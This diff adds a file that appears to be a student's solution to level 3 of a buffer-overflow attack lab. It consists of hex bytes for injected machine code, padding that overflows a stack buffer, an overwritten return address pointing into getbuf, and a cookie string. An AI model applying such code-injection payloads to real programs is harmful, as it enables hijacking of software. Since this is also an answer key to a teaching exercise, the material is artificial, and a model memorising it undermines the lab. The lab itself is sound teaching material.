@@ -1,0 +1,9 @@
+/* level3_input.txt */
+48 89 e7                      /* mov    %rsp,%rdi */
+68 fa 18 40 00                   /* pushq  $0x4018fa */
+c3                               /* retq   */
+41 41 41 41 41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41          /* 18 items to overflow the stack */
+41 41 41 41 41 41 41 41 41
+78 dc 61 55 00 00 00 00          /* stack address in getbuf */
+35 39 62 39 39 37 66 61 00              
